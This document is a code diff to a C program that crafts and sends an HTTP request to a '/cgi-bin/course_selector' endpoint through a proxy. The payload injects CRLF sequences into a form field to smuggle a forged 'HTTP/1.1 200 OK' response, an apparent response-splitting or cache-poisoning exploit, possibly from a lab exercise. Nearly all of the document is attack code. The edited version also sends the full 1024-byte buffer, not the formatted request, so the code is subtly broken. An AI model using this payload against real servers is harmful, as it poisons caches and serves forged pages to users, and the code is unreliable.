@@ -174,7 +174,6 @@ void _send(const int32_t client, const void * const data, size_t size) {
     }
 }
 
-#define PAYLOAD "course_id=67607%0d%0aConnection:%20Keep-Alive%0d%0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Sat%2010%20Jan%202026%2012:00:00%20GMT%0d%0aContent-Length:%20150"
 
 void empty_recv(const int sockfd) {
     char buf[1024];
@@ -187,15 +186,22 @@ void empty_recv(const int sockfd) {
 int32_t main() {
     int32_t sockfd = create_socket();
 
+
     _connect(sockfd, PROXY_ADDR, 8080);
 
-    const char mal_req[] = "POST /cgi-bin/course_selector? HTTP/1.1\r\n"
+    const char payload[] = "course_id=67607%0d%0aConnection:%20Keep-Alive%0d%0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Sat%2010%20Jan%202026%2012:00:00%20GMT%0d%0aContent-Length:%20150";
+    int payload_len = strlen(payload);
+
+    char mal_req[1024];
+
+    sprintf(mal_req, "POST /cgi-bin/course_selector? HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
         "Content-Type: application/x-www-form-urlencoded\r\n"
-        "Content-Length: 339\r\n"
+        "Content-Length: %d\r\n"
         "Connection: Keep-Alive\r\n"
         "\r\n"
-        PAYLOAD;
+        "%s",
+        payload_len, payload);
 
     _send(sockfd, mal_req, sizeof(mal_req) - 1);
 
